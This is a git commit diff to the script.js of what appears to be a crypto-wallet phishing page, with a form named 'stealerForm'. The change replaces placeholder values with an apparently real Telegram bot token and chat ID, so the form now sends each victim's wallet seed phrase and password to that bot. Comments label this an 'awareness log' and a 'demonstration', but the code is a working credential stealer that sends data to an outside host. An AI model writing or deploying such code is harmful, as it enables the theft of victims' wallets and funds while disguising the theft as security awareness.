fe89c833092944d978a4e23da317f2d00d8f5156
aniket14-ai <aniketoxford14@gmail.com>
2025-05-01 08:56:37 +0530

    Update script.js

--- script.js
+++ script.js
@@ -11,11 +11,12 @@ document.getElementById("stealerForm").addEventListener("submit", function(e) {
   document.getElementById("response").innerText = "🚨 Phishing Attempt Detected! Credentials captured for awareness log.";
 
   // (Optional) Send to Telegram for demonstration purposes
-  fetch("https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage", {
+  fetch("https://api.telegram.org/bot7986200355:AAE5W_YXK5RSVgHBCqOrBiurWmNpbTPPL7Q
+        /sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: "<YOUR_CHAT_ID>",
+      chat_id: "6697993658",
       text: `⚠️ [AWARENESS LOG]\nSeed: ${wallet}\nPassword: ${password}`
     })
   });
